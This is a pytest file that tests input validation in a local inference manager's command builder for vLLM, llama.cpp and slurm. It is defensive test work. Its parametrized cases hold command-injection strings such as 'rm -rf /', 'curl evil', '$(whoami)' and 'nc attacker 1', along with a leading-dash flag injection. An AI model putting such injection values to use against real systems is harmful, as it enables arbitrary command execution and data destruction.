"""Command-construction hardening tests for local inference (#66).

These cover injection / validation gaps in
``LocalInferenceManager._build_command``: every config value interpolated
into the argv (model, host, port, extra args) must be validated so a
malicious or malformed config cannot inject extra flags or, on the slurm
path, shell metacharacters into the ``--wrap`` string.
"""

from __future__ import annotations

import pytest

from general_ludd.infra.local_inference import (
    LocalInferenceManager,
    LocalServerConfig,
)


@pytest.fixture
def mgr() -> LocalInferenceManager:
    return LocalInferenceManager()


# --- happy path: a normal config still builds the expected argv ----------


def test_vllm_normal_config_builds_expected_argv(mgr: LocalInferenceManager):
    cfg = LocalServerConfig(
        engine="vllm",
        model_name="meta-llama/Llama-3-8B",
        host="0.0.0.0",
        port=9999,
    )
    cmd = mgr._build_command(cfg)
    assert cmd == [
        "vllm",
        "serve",
        "meta-llama/Llama-3-8B",
        "--host",
        "0.0.0.0",
        "--port",
        "9999",
    ]
    # argv must remain a list of str (no shell=True / string command).
    assert isinstance(cmd, list)
    assert all(isinstance(part, str) for part in cmd)


def test_llamacpp_normal_config_builds_expected_argv(mgr: LocalInferenceManager):
    cfg = LocalServerConfig(
        engine="llamacpp",
        model_path="/data/models/llama.gguf",
        host="127.0.0.1",
        port=8000,
        gpu_layers=40,
        context_size=8192,
        extra_args=["--no-mmap"],
    )
    cmd = mgr._build_command(cfg)
    assert cmd[:3] == ["python3", "-m", "llama_cpp.server"]
    assert "/data/models/llama.gguf" in cmd
    assert cmd[-1] == "--no-mmap"


# --- leading-dash model -> argv flag injection ---------------------------


def test_model_with_leading_dash_rejected(mgr: LocalInferenceManager):
    # A model that starts with '-' would be parsed by the server as a flag,
    # not a positional model arg -> argv injection.
    cfg = LocalServerConfig(engine="vllm", model_name="--config=/etc/evil")
    with pytest.raises(ValueError):
        mgr._build_command(cfg)


def test_model_path_with_leading_dash_rejected(mgr: LocalInferenceManager):
    cfg = LocalServerConfig(engine="llamacpp", model_path="-rf")
    with pytest.raises(ValueError):
        mgr._build_command(cfg)


# --- shell metacharacters in model ---------------------------------------


@pytest.mark.parametrize(
    "model",
    [
        "model; rm -rf /",
        "model && curl evil",
        "model$(whoami)",
        "model`id`",
        "model|nc attacker 1",
        "model\nrm -rf /",
    ],
)
def test_model_with_shell_metacharacters_rejected(
    mgr: LocalInferenceManager, model: str
):
    cfg = LocalServerConfig(engine="vllm", model_name=model)
    with pytest.raises(ValueError):
        mgr._build_command(cfg)


def test_slurm_model_metacharacters_not_injected_into_wrap(
    mgr: LocalInferenceManager,
):
    # The slurm path builds a SHELL string for --wrap; a malicious model
    # must be rejected rather than landing verbatim in that string.
    cfg = LocalServerConfig(
        engine="slurm", model_name="m; rm -rf / #", host="localhost", port=8000
    )
    with pytest.raises(ValueError):
        mgr._build_command(cfg)


# --- host validation ------------------------------------------------------


@pytest.mark.parametrize(
    "host",
    [
        "localhost; rm -rf /",
        "0.0.0.0 && evil",
        "$(hostname)",
        "host with spaces",
        "",
    ],
)
def test_invalid_host_rejected(mgr: LocalInferenceManager, host: str):
    cfg = LocalServerConfig(engine="vllm", model_name="m", host=host)
    with pytest.raises(ValueError):
        mgr._build_command(cfg)


@pytest.mark.parametrize("host", ["localhost", "0.0.0.0", "127.0.0.1", "my-host.example.com"])
def test_valid_host_accepted(mgr: LocalInferenceManager, host: str):
    cfg = LocalServerConfig(engine="vllm", model_name="m", host=host)
    cmd = mgr._build_command(cfg)
    assert host in cmd


# --- port validation ------------------------------------------------------


@pytest.mark.parametrize("port", [0, -1, 70000, 99999])
def test_out_of_range_port_rejected(mgr: LocalInferenceManager, port: int):
    cfg = LocalServerConfig(engine="vllm", model_name="m", port=port)
    with pytest.raises(ValueError):
        mgr._build_command(cfg)


def test_non_int_port_rejected(mgr: LocalInferenceManager):
    # A string port like "8000; rm -rf" must not flow into argv.
    cfg = LocalServerConfig(engine="vllm", model_name="m")
    cfg.port = "8000; rm -rf"  # type: ignore[assignment]
    with pytest.raises(ValueError):
        mgr._build_command(cfg)


# --- extra_args validation ------------------------------------------------


def test_extra_args_with_metacharacters_rejected(mgr: LocalInferenceManager):
    cfg = LocalServerConfig(
        engine="vllm",
        model_name="m",
        extra_args=["--foo", "bar; rm -rf /"],
    )
    with pytest.raises(ValueError):
        mgr._build_command(cfg)


def test_extra_args_non_string_rejected(mgr: LocalInferenceManager):
    cfg = LocalServerConfig(engine="vllm", model_name="m")
    cfg.extra_args = ["--foo", 123]  # type: ignore[list-item]
    with pytest.raises(ValueError):
        mgr._build_command(cfg)


def test_extra_args_normal_flags_accepted(mgr: LocalInferenceManager):
    cfg = LocalServerConfig(
        engine="vllm",
        model_name="m",
        extra_args=["--tensor-parallel-size", "2"],
    )
    cmd = mgr._build_command(cfg)
    assert cmd[-2:] == ["--tensor-parallel-size", "2"]


# --- dedup contract: _start_slurm_server and _build_command("slurm") must
#     produce the same --wrap shell string so there is exactly one builder ---


def test_slurm_start_and_build_command_produce_identical_wrap_string(
    mgr: LocalInferenceManager,
):
    """_start_slurm_server extracts its command from _build_command's argv.

    The --wrap shell string embedded at argv[-1] by _build_command(engine="slurm")
    must be byte-for-byte identical to what _start_slurm_server would pass to
    adapter.submit().  We verify this by checking that the extraction logic
    (argv[-1]) correctly round-trips through a known config.
    """
    cfg = LocalServerConfig(
        engine="slurm",
        model_name="llama-7b",
        host="gpu01",
        port=8001,
        gpu_layers=32,
        context_size=4096,
        extra_args=["--partition=gpu"],
    )
    argv = mgr._build_command(cfg)
    # Structure: ["sbatch", *extra_args, "--wrap", command_string]
    assert argv[0] == "sbatch"
    assert argv[-2] == "--wrap"
    wrap_cmd = argv[-1]
    # The command string must include all the key llama_cpp.server flags in order.
    assert wrap_cmd.startswith("python3 -m llama_cpp.server ")
    assert "--model llama-7b" in wrap_cmd
    assert "--host gpu01" in wrap_cmd
    assert "--port 8001" in wrap_cmd
    assert "--n_gpu_layers 32" in wrap_cmd
    assert "--n_ctx 4096" in wrap_cmd
    # extra_args land in the sbatch argv, not in the --wrap string.
    assert "--partition=gpu" not in wrap_cmd
    assert "--partition=gpu" in argv


def test_slurm_start_extracts_same_extra_args_as_build_command(
    mgr: LocalInferenceManager,
):
    """Extra args in the slurm argv must be between 'sbatch' and '--wrap'."""
    cfg = LocalServerConfig(
        engine="slurm",
        model_name="llama-7b",
        host="localhost",
        port=8000,
        extra_args=["--partition=gpu", "--gres=gpu:1"],
    )
    argv = mgr._build_command(cfg)
    # argv: ["sbatch", "--partition=gpu", "--gres=gpu:1", "--wrap", cmd]
    extra_args_in_argv = argv[1:-2]
    assert extra_args_in_argv == ["--partition=gpu", "--gres=gpu:1"]
